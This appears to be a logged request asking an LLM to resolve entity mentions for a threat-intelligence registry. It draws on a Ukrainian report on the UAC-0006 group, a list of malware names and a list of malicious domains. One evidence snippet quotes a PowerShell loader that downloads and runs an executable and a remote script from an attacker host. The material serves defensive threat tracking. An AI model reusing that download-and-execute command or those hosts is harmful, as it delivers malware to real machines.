=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Зведена інформація щодо діяльності угрупування UAC-0006 станом на 01.12.2023" — evidence: S1. "ння інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема:</p><ul><li>SMOKELOADER</li><li>LOADERX3</li><li>RMS</li><li>RDPWRAPPER</li><li>DANABOT</li><li>LUMMASTEALER</li><li>REDLINESTEALER</li><li>SYSTEMBC</li><li>TALESHOT</li><li>PIEJET</li><li>LOADNEST</li><li>HANGTHREAD</li><li>BACKSTAB</li><li>AUKILL</li></ul><p><br></p><p>Загалом, після первинного ураження ЕОМ і доставки SMOKELOADER, останній використовується для завантаження і запуску на ЕОМ інш" S2. "utionPolicy Bypass -File %TMP%\pssD713.ps1 $path = $Env:temp+'\AsmLUkHt.exe'; $client = New-Object System.Net.WebClient; $client.downloadfile('hXXp://downloadrezerves.ru/download11/mstsc.exe',$path); Start-Process -FilePath $path IEX (New-Object Net.Webclient).downloadstring("hXXp://downloadrezerves.ru/index.php") %SY"
Entities:
E1. Loader.dll
E2. LOADGRIP
E3. HijackLoader
E4. SMOKELOADER
E5. SHADOWLADDER
E6. CCleaner.exe
E7. GHOSTPULSE
E8. ATERA
E9. PICASSOLOADER
E10. XWORM
E11. RDP Wrapper
E12. mstsc.exe
E13. rdp.exe
E14. rutserv.exe
E15. AppLocker
E16. LiteManager Pro - Server
E17. Screengrabber
E18. Minesweeper
E19. FileGrabber
E20. IDAT
E21. BIASBOAT
E22. TALESHOT
E23. XENORAT
E24. LITEMANAGER
E25. MESHAGENT
E26. DARKTRACKRAT
E27. SECTOPRAT
E28. DarkTortilla
E29. METASPLOIT
E30. MEDUZASTEALER
E31. MARSSTEALER
E32. LUMMASTEALER
E33. STEELHOOK
E34. PyInstaller
E35. ResetEngine.dll
E36. SPECTR
E37. SMBEXEC
E38. SIEM
E39. NSIS (Nullsoft Scriptable Install System)
E40. ACROBAIT
E41. Syncthing
E42. SENDEMAIL
E43. SmartAssembly .NET
E44. MASEPIE
E45. SDELETE
E46. PEAKLIGHT
E47. EMPIREPAST
E48. Impacket
E49. PIVOTNACCI
E50. zapit.exe
E51. Python
E52. SECONDBEST
E53. AnyDesk
E54. OpenSSH
E55. REGEORG.NEO
E56. HATVIBE
E57. guid.txt
E58. PhantomTools
E59. KNUCKLETOUCH
E60. Files.dll
E61. HYDRA
E62. QUEUESEED
E63. Dark Crystal RAT (DCRAT) [aka DARKCRYSTALRAT (DCRAT), DarkCrystal RAT]
E64. OCEANMAP
E65. ValoHack
E66. REVERSESSH
E67. AutoIt [aka AutoIt3]
E68. ruhbll32.dll
E69. ICYWELL
E70. Social [aka Social.dll]
E71. Google Authenticator
E72. curl [aka curl.exe]
E73. Microsoft Authenticator
E74. RDPWRAPPER
E75. DANABOT
E76. REDLINESTEALER
E77. SYSTEMBC
E78. PIEJET
E79. LOADNEST
E80. HANGTHREAD
E81. BACKSTAB
E82. AUKILL
E83. LOADERX3
E84. drive.google2.certifiedauth.in
E85. rafraystore.ru
E86. trust-certificate.net
E87. analytics.certifiedauth.in
E88. geolocation.authcheck.in
E89. notifications.certifiedauth.in
E90. stats.certifiedauth.in
E91. admin.certifiedauth.in
E92. notifications.google.com.getssl.click
E93. dytiachatvorchist.pics
E94. konkurs-vesna-24.ru
E95. agentsuperpupervinil.ru
E96. vivianstyler.ru
E97. blogger.google2.certifiedauth.in
E98. ccbaminumpot.ru
E99. picwalldoor.ru
E100. blogger.certifiedauth.in
E101. monopoliafromyou.ru
E102. reg.ru
E103. rmssrv.ru
E104. blogger.google.com.getssl.click
E105. cloudflare.com
E106. net.ssl4.site
E107. golos-konkurs-uah.eu
E108. googledrive.com.ssl2.site
E109. golos-konkursu.eu
E110. edisk.ukr.net.ssl3.site
E111. golos-telegtam.eu
E112. blakejones.xyz
E113. czyrqdnvpujmmjkfhhvs4knf1av02demj.oast.fun
E114. worker-misty-mouse-6ac7.aky15825.workers.dev
E115. czyrqdnvpujmmjkfhhvsclx05sfi23bfr.oast.fun
E116. czyrqdnvpujmmjkfhhvsgapqr3hclnhhj.oast.fun
E117. czyrqdnvpujmmjkfhhvsvlaax17vd5r6v.oast.fun
E118. balletmasters.eu
E119. res.live.com.getssl.click
E120. itskids.pics
E121. bdf.gov.ua
E122. bom02.gotdns.ch
E123. login.live.com.exmo.day
E124. bihei.eu
E125. documentreader.net
E126. newyorktlimes.life
E127. play.certifiedauth.in
E128. balet-me.pro
E129. documents-reader.com
E130. balet-me.us
E131. ua-konkurs.pics
